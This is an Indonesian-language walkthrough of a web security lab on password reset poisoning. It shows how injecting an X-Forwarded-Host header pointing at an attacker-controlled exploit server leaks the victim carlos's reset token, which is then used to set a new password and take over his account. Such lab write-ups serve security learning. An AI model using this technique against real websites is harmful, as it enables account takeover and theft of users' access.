@@ -1,0 +1,80 @@
+LAB 2 Password reset poisoning via middleware
+
+Brief:
+	lab rentan dengan password poisoning, user carlos akan mengklik semua email yang dia terima.
+	
+	credentials: wiener:peter
+	
+Tujuan:
+	login ke akun carlos
+	
+Analisa:
+	Untuk memudahkan dan memahami ikuti workflow dari login, logout, dan reset akun
+	
+		step:
+		
+			A. Ini request Post login untuk login akun
+			
+			B. setelah login ini adalah laman dan request GET my-account
+			
+			C. Ini GET request untuk logout
+
+			D. ini request GET untuk mereset tombol forgot-password
+
+			E. ini request POST untuk mereset akun dengan username
+			
+			F. ini request GET temp token forgot password
+			
+				setelah mengklik email untuk mereset akun nanti ada temp token yang akan dimuat, token inilah yang digunakan untu mengganti sandi.
+				
+			G. request POST forgot-password?temp-forgot-password-token ini untuk mereset akun dengan mengisi kata sandinya
+
+	Jadi workflow untuk mereset password seperti ini:
+		
+			- user mengklik dan mengirim request GET /forgot-password
+			
+				setelah itu
+				
+			- user mengisi dengan username atau email akunnya, lalu mengirim request POST /forgot-password dengan parameter username
+			
+			situs web akan mengirim link yang berisi token unik ke email user. setelah di klik
+			
+			- user akan mengirim request GET /forgot-password?temp-forgot-password-token=TOKEN 
+			
+			- lalu user akan mengisi password baru dengan request POST /forgot-password?temp-forgot-password-token=TOKEN
+			
+				dan parameter: temp-forgot-password-token=TOKEN&new-password-1=passwordbaru&new-password-2=passwordbaru
+			
+			dan seperti itulah workflownya
+		
+	kerentanan:
+	
+		1. pada POST request di step (E) untuk mereset akun dengan request : POST /forgot-password dengan parameter username:
+		
+			cek bahwa X-Forwarded-Host disupport diheader dengan url yang ada di exploit server
+		
+			tambahkan X-Forwarded-Host: exploit.server
+			
+			lalu di akses log ada request yang dikirim ke server
+		
+		2. sekarang kirim lagi requestnya dan ganti parameter username dengan username carlos: username=carlos
+		
+			lalu ke akses log dan ada request dari akun carlos GET /forgot-password?temp-forgot-password-token=TOKEN
+		
+				ini bisa terjadi karna carlos mengklik email yang dia terima untuk mereset password tanpa mengetahui bahwa attacker juga bisa menerima token untuk mereset password
+				
+				karna request X-Forwarded-Host mengarah ke server attacker
+				
+			copy tokennya
+		
+		3. load request step (G) GET /forgot-password?temp-forgot-password-token=TOKEN dengan token yang di copy sebelumnnya
+		
+		4. ke step(G) atau kerequest yang digunakan untuk mereset password dengan parameter password barunya: POST /forgot-password?temp-forgot-password-token=TOKEN
+														      
+												       dan parameter: temp-forgot-password-token=TOKEN&new-password-1=passwordbaru&new-password-2=passwordbaru
+		
+			ganti kedua parameter token dengan token carlos dan isi password baru lalu kirim request
+			
+			dan status 302 found
+			
+		5. login dengan akun carlos dan password barunya lalu berhasil
